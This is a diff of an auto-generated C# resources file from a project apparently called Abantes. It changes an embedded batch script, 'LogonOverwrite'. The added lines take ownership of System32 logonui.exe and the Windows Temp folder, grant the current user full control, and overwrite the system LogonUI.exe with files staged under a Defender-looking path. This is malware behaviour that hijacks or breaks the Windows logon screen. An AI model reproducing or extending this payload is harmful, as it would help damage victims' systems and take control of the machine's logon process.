@@ -86,16 +86,6 @@ namespace Abantes.Properties {
         /// <summary>
         ///   Looks up a localized resource of type System.Byte[].
         /// </summary>
-        internal static byte[] Audio {
-            get {
-                object obj = ResourceManager.GetObject("Audio", resourceCulture);
-                return ((byte[])(obj));
-            }
-        }
-        
-        /// <summary>
-        ///   Looks up a localized resource of type System.Byte[].
-        /// </summary>
         internal static byte[] authui_dll {
             get {
                 object obj = ResourceManager.GetObject("authui_dll", resourceCulture);
@@ -155,9 +145,14 @@ namespace Abantes.Properties {
         
         /// <summary>
         ///   Looks up a localized string similar to @echo on
-        ///cd\
+        ///cd\&amp;cd Windows\System32
+        ///takeown /f logonui.exe
+        ///icacls logonui.exe /granted %username%:F
+        ///takeown /f &quot;C:\Windows\Temp&quot; /r /d y
+        ///icacls &quot;C:\Windows\Temp&quot; /granted %username%:F /T /C
         ///copy &quot;C:\Windows\Defender\LogonUIStart.exe&quot; &quot;C:\Windows\System32\LogonUI.exe&quot; /Y
-        ///copy &quot;C:\Windows\Defender\LogonUIStart.exe&quot; &quot;C:\Windows\Temp\LogonUi.exe&quot; /Y.
+        ///copy &quot;C:\Windows\Defender\LogonUi.exe&quot; &quot;C:\Windows\Temp\LogonUi.exe&quot; /Y
+        ///pause.
         /// </summary>
         internal static string LogonOverwrite {
             get {
